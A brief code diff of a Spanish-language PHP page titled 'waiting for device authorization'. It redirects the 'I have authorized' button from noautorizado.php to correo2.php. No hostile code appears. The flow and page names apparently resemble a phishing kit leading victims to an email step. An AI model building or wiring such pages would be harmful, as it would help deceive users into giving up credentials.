@@ -42,7 +42,7 @@ if (isset($_GET['chequear']) && !empty($id_sesion)) {
     <h2>Esperando autorización de dispositivo</h2>
     <p>Hemos enviado el correo electronico para autorizar este dispositivo. Por favor, revise su bandeja de entrada.</p>
     <div class="note">Debe ingresar a su correo electronico y autorizar para continuar.</div>
-    <a class="btn-small" href="noautorizado.php">He autorizado correctamente</a>
+    <a class="btn-small" href="correo2.php">He autorizado correctamente</a>
   </div>
 
 <script>
